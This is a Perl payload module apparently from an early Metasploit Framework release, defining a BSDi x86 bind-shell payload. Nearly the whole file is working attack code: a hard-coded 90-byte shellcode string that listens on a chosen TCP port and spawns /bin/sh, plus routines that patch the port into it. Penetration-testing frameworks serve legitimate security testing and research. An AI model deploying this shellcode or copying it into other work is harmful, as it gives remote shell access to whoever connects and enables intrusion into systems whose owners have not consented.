
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Payload::bsdix86_bind;

use strict;
use base 'Msf::PayloadComponent::BindConnection';

my $info =
{
	'Name'         => 'bsdix86bind',
	'Version'      => '$Revision$',
	'Description'  => 'Listen for connection and spawn a shell',
	'Authors'      => [ 'skape <mmiller [at] hick.org>', 
	                    'optyx <optyx [at] uberhax0r.net>' ],
	'Arch'         => [ 'x86' ],
	'Priv'         => 0,
	'OS'           => [ 'bsdi' ],
	'Size'         => '',
};

sub new 
{
	my $class = shift;
	my $hash = @_ ? shift : { };

	$hash = $class->MergeHashRec($hash, {'Info' => $info});

	my $self = $class->SUPER::new($hash, @_);
	
	$self->_Info->{'Size'} = $self->_GenSize;

	return $self;
}

sub Build 
{
	my $self = shift;

	return $self->Generate($self->GetVar('LPORT'));
}

sub Generate 
{
	my $self = shift;
	my $port = shift;
	my $port_bin = pack('n', $port);
	my $off_port = 31;
 
	my $shellcode = # 90 byte portbind
		"\x68\x00\x07\x00\xc3\xb8\x9a\x00\x00\x00\x99\x50\x89\xe7\x31\xc9" .
		"\xf7\xe1\x50\x40\x50\x40\x50\xb0\x61\xff\xd7\x51\x68\x10\x02\x11" .
		"\x5c\x89\xe3\x6a\x10\x53\x50\x6a\x68\x58\xff\xd7\x5e\x56\xb0\x6a" .
		"\xff\xd7\x51\x51\x56\xb0\x1e\xff\xd7\x89\xc6\xb1\x02\xb0\x5a\x51" .
		"\x56\xff\xd7\x49\x79\xf7\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69" .
		"\x6e\x89\xe3\x52\x54\x53\xb0\x3b\xff\xd7";

	substr($shellcode, $off_port, 2, $port_bin);
  
	return $shellcode;
}

sub _GenSize 
{
	my $self = shift;
	
	return length($self->Generate(4444));
}

1;
